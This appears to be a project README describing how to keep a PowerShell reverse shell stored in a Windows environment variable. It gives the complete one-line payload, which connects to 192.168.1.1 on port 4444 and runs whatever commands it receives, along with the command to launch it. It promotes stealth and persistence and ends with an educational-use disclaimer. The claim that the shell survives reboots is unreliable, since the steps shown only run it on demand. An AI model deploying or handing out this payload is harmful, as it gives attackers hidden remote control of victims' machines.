## Reverse Shell Persistence with Windows Environment Variables

## Overview

 This project demonstrates how to create a persistent reverse shell using Windows environment variables. By storing the reverse shell payload in an environment variable, you can stealthily execute it across multiple sessions.

## Usage
1. Set the Reverse Shell in the Environment Variable


``` bash
setx REV_SHELL "$client = New-Object Net.Sockets.TcpClient('192.168.1.1',4444); if ($client.Connected) { $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) { $data = ([Text.Encoding]::ASCII).GetString($bytes, 0, $i); $sendback = (iex $data 2>&1 | Out-String); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; $sendbyte = ([Text.Encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte, 0, $sendbyte.Length); $stream.Flush() } $client.Close() }"```
```

2. Execute the Reverse Shell

``` bash
powershell.exe -Command "%REV_SHELL%"

```

Why Use This Method?
  
* Stealth: Hides the reverse shell in environment variables. <br>
*  Persistence: The shell remains across sessions and reboots. <br>
*  Convenience: Easy to execute when needed.

# POC 


![image](https://github.com/user-attachments/assets/9368c5ac-7819-448d-b454-f7968bf6f7f0)

![image](https://github.com/user-attachments/assets/8b5da887-152a-443d-a857-7985a0f78460)


## Disclaimer

This project is intended for educational purposes only. It demonstrates a reverse shell technique using Windows environment variables for cybersecurity professionals and ethical hackers to understand potential attack vectors. Do not use this method for illegal or unauthorized activities. Always obtain proper authorization before conducting any security testing.
